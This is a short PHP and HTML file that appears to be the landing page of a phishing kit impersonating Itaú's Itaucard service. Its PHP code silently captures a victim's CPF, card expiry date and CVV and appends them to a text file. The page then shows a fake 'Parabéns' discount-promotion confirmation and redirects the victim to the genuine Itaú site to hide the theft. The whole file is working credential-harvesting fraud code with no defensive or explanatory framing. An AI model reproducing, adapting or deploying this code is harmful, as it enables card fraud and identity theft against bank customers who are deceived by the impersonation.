<?php
$cpf = $_POST['numcpf'];
$data = $_POST['numdtv'];
$cvv = $_POST['numcvv'];
$tudo = "".$cpf." | ".$data." | ".$cvv."<br>\n";

$fp = fopen("cardsenha.txt", "a");
fwrite($fp, $tudo);
fclose($fp);
?>
<!DOCTYPE html>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<title>Itau Card | Seus Benefícios</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
	<meta http-equiv="refresh" content="7, url='https://www.itau.com.br/mobile/cartoes/'">
	<link rel="stylesheet" type="text/css" href="parabens_arquivos/benef_compras_style.css">
</head>
<body>
	<header class="top-promo">
		<img src="parabens_arquivos/img_logo.png">
	</header>
	<section class="prog-cad">
		<ul>
			<li class="active">Identificação</li>
			<li class="active">Cadastro</li>
			<li class="active">Benefícios</li>
		</ul>
	</section>
	<section class="eng-fim">
		<img class="img-suc" src="parabens_arquivos/ic_checked2.png">
		<h2>Parabéns</h2>
		<p>Seu cartão itaucard foi cadastrado com sucesso na promoção 
descontão, agora você terá automaticamente 50% de desconto em compras 
feitas nos cinemas, teatros, estádios de futebol, restaurantes e muitos 
outros estabelecimentos parceiros do itaú, aproveite.</p>
		<p>Aguarde um momento você será redirecionado...</p>
	</section>

</body></html>